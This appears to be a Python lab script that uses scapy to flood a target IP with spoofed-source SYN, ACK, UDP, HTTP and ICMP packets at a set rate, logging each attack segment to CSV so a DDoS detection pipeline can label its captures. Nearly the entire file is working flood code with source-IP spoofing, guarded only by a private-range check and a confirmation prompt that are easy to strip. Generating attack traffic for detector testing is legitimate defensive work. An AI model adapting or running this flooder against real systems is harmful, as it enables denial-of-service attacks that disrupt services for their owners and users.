"""
attacker_flood.py - lab DDoS traffic generator (ATTACKER MACHINE)

Run this on the SECOND machine to flood the victim (192.168.1.123) so the
victim-side capture records real inbound attack traffic. It emits the exact
attack_timeline_*.csv schema the detection pipeline grades against, so its
output drops straight into data/attack_timelines/ on the victim.

SELF-CONTAINED: on first run it pip-installs scapy if missing and checks for a
working Npcap send path. It does NOT download or execute any remote code.

SAFETY: refuses any target outside RFC1918 private ranges (10/8, 172.16/12,
192.168/16) - this is a lab tool, not an internet weapon. Requires an explicit
confirmation unless --yes is passed. Only use on networks and hosts you own.

Each attack runs for --seconds with spoofed source IPs (many distinct peers ->
the distributed-flood signature). Segments are logged with start/end epochs so
the victim's capture can be labelled by time overlap.

Usage (Administrator PowerShell on the attacker machine):
    python attacker_flood.py --target 192.168.1.123
    python attacker_flood.py --target 192.168.1.123 --seconds 15 --pps 220 --yes
    python attacker_flood.py --target 192.168.1.123 --attacks SYN,UDP,ACK,HTTP
"""
import os
import sys
import csv
import time
import random
import argparse
import subprocess
import ipaddress
from datetime import datetime


# ── bootstrap: ensure scapy is importable ──
def ensure_scapy():
    try:
        import scapy  # noqa: F401
        return
    except ImportError:
        print("[*] scapy not found - installing (pip install scapy)...")
        subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "scapy"],
                       check=True)
        print("[+] scapy installed.")


ensure_scapy()
from scapy.all import IP, TCP, UDP, ICMP, Raw, send, conf  # noqa: E402
conf.verb = 0


# ── safety: only private targets ──
def assert_private(ip_str):
    try:
        ip = ipaddress.ip_address(ip_str)
    except ValueError:
        sys.exit(f"[-] Not a valid IP: {ip_str}")
    if not ip.is_private:
        sys.exit(f"[-] Refusing non-private target {ip_str}. This is a lab tool; "
                 f"target must be in 10/8, 172.16/12 or 192.168/16.")


def spoof_src():
    """Random private-ish source IP -> many distinct peers per window."""
    return f"{random.randint(11, 223)}.{random.randint(0, 255)}." \
           f"{random.randint(0, 255)}.{random.randint(1, 254)}"


# ── one attack packet, by type ──
def build_packet(kind, target):
    src = spoof_src()
    sport = random.randint(1024, 65535)
    if kind == "SYN":
        return IP(src=src, dst=target) / TCP(sport=sport, dport=80, flags="S")
    if kind == "ACK":
        return IP(src=src, dst=target) / TCP(sport=sport, dport=80, flags="A")
    if kind == "UDP":
        dport = random.choice([53, 123, 161, random.randint(1, 65535)])
        return IP(src=src, dst=target) / UDP(sport=sport, dport=dport) / Raw(b"X" * 512)
    if kind == "HTTP":
        req = f"GET /{random.randint(0, 9999)} HTTP/1.1\r\nHost: {target}\r\n\r\n"
        return IP(src=src, dst=target) / TCP(sport=sport, dport=80, flags="PA") / Raw(req.encode())
    if kind == "ICMP":
        return IP(src=src, dst=target) / ICMP() / Raw(b"X" * 512)
    raise ValueError(f"unknown attack kind {kind}")


def run_attack(kind, target, seconds, pps, intensity):
    """Sends `kind` traffic at ~pps for `seconds`; returns a timeline row dict."""
    print(f"[>] {kind:<5} flood -> {target}  ({pps} pps for {seconds}s)")
    start = time.time()
    start_dt = datetime.now()
    sent = 0
    interval = 1.0 / pps if pps > 0 else 0
    deadline = start + seconds
    while time.time() < deadline:
        try:
            send(build_packet(kind, target))
            sent += 1
        except Exception as e:
            print(f"[!] send error ({kind}): {e}")
            print("    Is Npcap installed and are you running as Administrator?")
            break
        # pace to target pps
        nap = start + sent * interval - time.time()
        if nap > 0:
            time.sleep(nap)
    end = time.time()
    end_dt = datetime.now()
    dur = end - start
    print(f"    {sent} packets in {dur:.1f}s ({sent / max(dur, 1e-9):.0f} pps)")
    return {
        "attack_type": kind, "target": target, "intensity": intensity,
        "start_time": start_dt.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
        "end_time": end_dt.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
        "start_epoch": round(start, 3), "end_epoch": round(end, 3),
        "duration_sec": round(dur, 3), "packets_sent": sent,
        "pps": round(sent / max(dur, 1e-9), 1),
    }


INTENSITY_PPS = {"light": 60, "medium": 130, "heavy": 220}


def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[1],
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True, help="victim IP (must be private)")
    ap.add_argument("--attacks", default="SYN,UDP,ACK,HTTP",
                    help="comma list from SYN,UDP,ACK,HTTP,ICMP (default all four)")
    ap.add_argument("--seconds", type=int, default=15, help="seconds per attack (default 15)")
    ap.add_argument("--pps", type=int, default=None,
                    help="packets/sec; overrides --intensity")
    ap.add_argument("--intensity", choices=list(INTENSITY_PPS), default="heavy")
    ap.add_argument("--out-dir", default=".", help="where to write attack_timeline_*.csv")
    ap.add_argument("--yes", action="store_true", help="skip the confirmation prompt")
    args = ap.parse_args()

    assert_private(args.target)
    kinds = [k.strip().upper() for k in args.attacks.split(",") if k.strip()]
    bad = [k for k in kinds if k not in ("SYN", "UDP", "ACK", "HTTP", "ICMP")]
    if bad:
        sys.exit(f"[-] Unknown attack types: {bad}")
    pps = args.pps if args.pps is not None else INTENSITY_PPS[args.intensity]

    print("=" * 64)
    print(f"  LAB DDoS GENERATOR -> {args.target}")
    print(f"  attacks: {kinds}   {pps} pps x {args.seconds}s each")
    print("  Use only on hosts/networks you own. Ctrl-C to abort.")
    print("=" * 64)
    if not args.yes:
        if input("Proceed? [y/N] ").strip().lower() not in ("y", "yes"):
            sys.exit("[-] Aborted.")

    rows = []
    try:
        for kind in kinds:
            rows.append(run_attack(kind, args.target, args.seconds, pps, args.intensity))
    except KeyboardInterrupt:
        print("\n[!] Interrupted - saving what ran so far.")

    if not rows:
        sys.exit("[-] No attacks completed; nothing to log.")

    os.makedirs(args.out_dir, exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = os.path.join(args.out_dir, f"attack_timeline_{stamp}.csv")
    with open(out, "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        w.writeheader()
        w.writerows(rows)
    print(f"\n[+] Wrote {out}")
    print(f"    {len(rows)} segments, {sum(r['packets_sent'] for r in rows):,} packets total.")
    print("[i] Copy this CSV into the victim's data/attack_timelines/ before running verify.")


if __name__ == "__main__":
    main()
